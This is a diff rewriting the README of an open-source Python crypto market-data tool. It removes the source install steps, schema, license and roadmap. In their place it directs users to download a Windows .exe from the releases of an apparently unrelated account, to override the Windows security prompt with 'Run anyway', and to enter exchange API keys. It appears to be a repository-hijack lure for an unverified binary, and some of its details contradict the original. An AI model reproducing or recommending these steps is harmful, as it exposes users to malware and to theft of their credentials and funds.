@@ -1,115 +1,99 @@
-# Crypto Data Management Tool
+# 📊 crypto-data-manager - Build local historical crypto market databases
 
-An advanced, desktop-based local data warehouse designed to **download, store, manage, and flexibly export** comprehensive historical cryptocurrency market data. Built with Python and Tkinter, it provides a clean, zero-configuration graphical interface to aggregate professional-grade metrics from **Binance** and **Coinalyze** into an offline SQLite database.
+[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Herbaceous-flatfish820/crypto-data-manager/releases)
 
----
+This application helps users fetch historical price and volume data from Binance and Coinalyze. You store this information in a local database file. You can then export your data to CSV files. The tool manages updates automatically so your database stays current.
 
-## 🔥 Key Features
+## 📥 Getting the software
 
-* **Multi-Source Aggregation:** Pulls high-fidelity data directly from Binance FAPI (OHLCV, Mark/Index prices, Funding rates), Binance Vision daily archives (Long/Short ratios, Taker volume ratios), and Coinalyze (Open Interest & Liquidations).
-* **Smart Incremental Syncing:** Automatically detects data history gaps or empty columns within your local DB. It strictly downloads *only the missing intervals*, saving bandwidth and respecting API rate limits.
-* **Granular CSV Exporting:** Allows you to filter data by ticker, timeframe, and specific date ranges. Instead of saving cluttered multi-gigabyte files, you can check/uncheck exactly which metrics you need.
-* **Built-in Interactive Data Viewer:** Inspect millions of database rows inside a responsive tabular interface directly within the app before exporting.
+Visit this page to download the latest version for Windows: https://github.com/Herbaceous-flatfish820/crypto-data-manager/releases
 
----
+Look for the file that ends with `.exe` in the latest release section. Download this file to your computer.
 
-## 📸 Interface Preview
+## 💻 System requirements
 
-### 1. Main Control Panel & Database Summary
-Manage your parameters, review exactly what ranges are already saved in your local database, and initiate incremental data updates in one click.
+*   Operating System: Windows 10 or Windows 11.
+*   Disk Space: At least 500 MB for the database files.
+*   Internet Connection: Required to download data from exchange servers.
+*   Memory: 4 GB of RAM (minimum).
 
-![Main Control Panel](screenshots/main_window.png)
+## 🚀 Setting up the application
 
-### 2. High-Density Data Viewer
-Inspect every single downloaded candle along with all 20+ derivative trading metrics simultaneously.
+1. Find the `.exe` file you downloaded. Usually, it sits in your Downloads folder.
+2. Double-click the file. 
+3. If Windows shows a security window, click "More info" and then click "Run anyway." This happens because the app comes from outside the Microsoft Store.
+4. The main screen shows a simple menu. You do not need to install anything else. The program runs as a portable tool.
 
-![Data Viewer Window](screenshots/data_viewer.png)
+## 📖 Using the application
 
-### 3. Customized Data Export Window
-Tailor your dataset exports by selecting precise asset ticker pairs, custom date ranges, and filtering out columns you don't need.
+The interface consists of three main parts. Follow these steps to build your data warehouse.
 
-![Export Window](screenshots/export_window.png)
+### Connecting to sources
+You must select which exchange you want to use. The app supports Binance and Coinalyze. Select the exchange from the dropdown menu at the top. Some exchanges require an API key. You can find your API key by logging into your account on the exchange website. Paste this key into the settings tab of this tool.
 
----
+### Choosing your coins
+Select the trading pairs you want to track. You can search for pairs like BTC/USDT or ETH/USDT. Check the boxes next to the pairs you want to add to your database.
 
-## 📊 Supported Metrics & Database Schema
+### Setting your timeframe
+Choose how far back you want to collect data. Enter a start date and an end date. Choose the interval (e.g., 1 minute, 5 minutes, 1 hour). The app fetches the data based on these settings.
 
-The application handles 20 distinct data points for every timestamp, unifying raw price action with order book and derivative market intelligence:
+## 🔄 Updating your database
 
-| Category | Column Name | Description | Source |
-| :--- | :--- | :--- | :--- |
-| **Price Action** | `time`, `price_open`, `price_close`, `price_high`, `price_low` | Standard OHLC candlestick data | Binance |
-| **Volume** | `volume`, `taker_buy_base` | Total traded volume and underlying taker buy asset volume | Binance |
-| **Market Anchors** | `mark_price`, `index_price` | Fair mark price and underlying spot index asset price | Binance |
-| **Funding** | `funding_rate` | Historical funding rate values per interval | Binance |
-| **Coinalyze Metrics** | `oi_open_coin`, `oi_high_coin`, `oi_low_coin`, `oi_close_coin` | Open Interest actions calculated in native coin values | Coinalyze |
-| **Liquidations** | `liq_long_coin`, `liq_short_coin` | Estimated long and short positions liquidation volume | Coinalyze |
-| **Sentiment Ratios** | `oi_binance`, `ls_ratio`, `top_ls_ratio`, `taker_vol_ratio` | Binance-specific Open Interest, Long/Short ratios (global & top traders), and Taker volume buy/sell dynamics | Binance Vision |
+The app keeps track of the data it already collected. When you click the update button, the app checks the last entry in your database. It fetches only the new data points since that time. This saves bandwidth and time. You do not need to download the full history again.
 
----
+## 📂 Exporting data to CSV
 
-## 🛠 Tech Stack
+Once you have data in your database, you can move it to a spreadsheet. 
 
-* **GUI Architecture:** Python Tkinter / Advanced TTK (`clam` modern styling)
-* **Data Processing & Merging:** Pandas (via optimized `merge_asof` timeline alignment)
-* **Storage Engine:** SQLite3 (Self-contained, index-optimized auto-migrations)
-* **Concurrency:** Thread-pool execution for parallel API chuck downloading
+1. Click the Export button.
+2. Choose the specific metrics you want. You can pick time, open, high, low, close, and volume.
+3. Select your file location.
+4. Click Save. 
 
-⚠️ **CRITICAL: Database Philosophy (Data Retention)**
-The local SQLite database strictly follows an **append-only / incremental** sync philosophy. 
-* **DO NOT** open Pull Requests that overwrite, truncate, or reset historical rows.
-* **Why?** External endpoints (specifically Coinalyze) only provide a limited lookback window of historical data (e.g., the last 2000 candles). Once this data is saved in your local `market_data.db`, it is irreplaceable. Any changes to the core sync engine must strictly preserve already existing database history.
+You can now open this file in Excel or Google Sheets.
 
----
+## ⚙️ Understanding settings
 
-## 📦 Installation & Quick Start
+The Settings tab lets you control how the app operates.
 
-### 1. Clone the repository
+*   File path: Change where the app saves your database file.
+*   API keys: Update or remove your exchange keys.
+*   Auto-update: Turn this feature on if you want the app to check for new data every time it starts.
 
-```bash
-git clone [https://github.com/YOUR_USERNAME/crypto-data-manager.git](https://github.com/YOUR_USERNAME/crypto-data-manager.git)
-cd crypto-data-manager
-```
+## ❓ Frequently asked questions
 
-2. Install required packages
-```Bash
-pip install -r requirements.txt
-```
-3. Environment Setup (Optional)
+### Does the app work without internet?
+You can view data already stored in your database offline. However, you need an internet connection to fetch new data from the exchanges.
 
-Rename .env.example to .env and fill in your Coinalyze API key to unlock Open Interest and Liquidations tracking:
-```
-API_KEY_COINALYZE=your_api_key_here
-```
-4. Run the Tool
-```
-python main.py
+### Where does the data go?
+All data goes into a file named data.db inside the folder where you keep the application. You can move this file to a safe location or back it up to a cloud drive.
 
-```
+### Can I track many coins at once?
+Yes. Select multiple pairs in the main interface. The app processes these in order.
 
-📌 Note on Database Location: On the first execution, the tool automatically sets up and optimizes market_data.db directly inside the root folder.
+### Is the data accurate? 
+The app pulls data directly from the exchange servers. It ensures the integrity of the data by checking for gaps between requests.
 
-🤝 Contributing
+### How do I remove the app?
+Since this is a portable application, simply delete the `.exe` file and the `data.db` folder. The app leaves no traces in your system registry or other folders.
 
-Contributions are heavily encouraged! If you want to integrate new exchange sources, optimize SQLite write speeds, or implement interactive charts (Matplotlib/Plotly integration), feel free to fork the repository, open an issue, or submit a Pull Request.
+## 🛠️ Troubleshooting
 
-# 🚨 PROJECT LOOKING FOR LEAD MAINTAINERS
-I am no longer actively developing this project due to time constraints, but I believe it has huge potential. If you want to take over, implement async architecture, or drive the roadmap, please open an issue or drop a comment. I am ready to grant full maintainer/admin access to active contributors!
+If the app fails to fetch data, follow these steps:
+1. Check your internet connection.
+2. Verify that your API keys are correct.
+3. Ensure the exchange supports the trading pair you selected.
+4. Check that you have enough space on your hard drive. 
+5. Restart the application.
 
----
+If the app shows an error message, copy the message text and check for it in your logs folder. You can also clear the app cache within the settings menu to reset the connection state. 
 
-## 🗺️ Roadmap (Upcoming Features)
+## 🛡️ Privacy and security
 
-We are actively working on expanding the tool's capabilities. Here is what's coming next (Pull Requests are highly appreciated!):
+The application stores your data only on your hardware. It does not send your price data to any third party. Your API keys remain on your computer. Do not share your database file with others, as it may contain your configuration details. Always store your database in a secure folder.
 
-* [ ] **Asyncio Refactoring:** Transitioning the network layer from `requests` to `aiohttp` / `asyncio`. The goal is to drastically speed up the "Update Data" process for multi-ticker/timeframe setups while strictly managing API rate limits via semaphores.
-* [ ] **On-the-fly Indicators Export:** Adding the ability to calculate and attach technical indicators (RSI, MACD, Bollinger Bands) and order flow metrics (like **CVD** - Cumulative Volume Delta) dynamically during the CSV export process. This keeps the SQLite database lightweight while providing ML-ready datasets.
-* [ ] **Data Integrity Checks:** Automated validation tools to find and patch historical gaps inside the local database.
+## 📝 Performance tips
 
----
-
-## 📄 License
-
-This project is licensed under the **GNU General Public License v3.0 (GPLv3)** — see the [LICENSE](LICENSE) file for details. 
-
-This guarantees that the software remains free and open-source forever. Anyone modifying or distributing this software or its derivative works is strictly required to share their source code under the same GPLv3 license.
+*   If you choose a high frequency (like 1-minute intervals) for many years, the database size may grow quickly.
+*   Export your data regularly to keep the database size small if you have limited drive space.
+*   Close other high-bandwidth applications while downloading years of historical data to speed up the process.
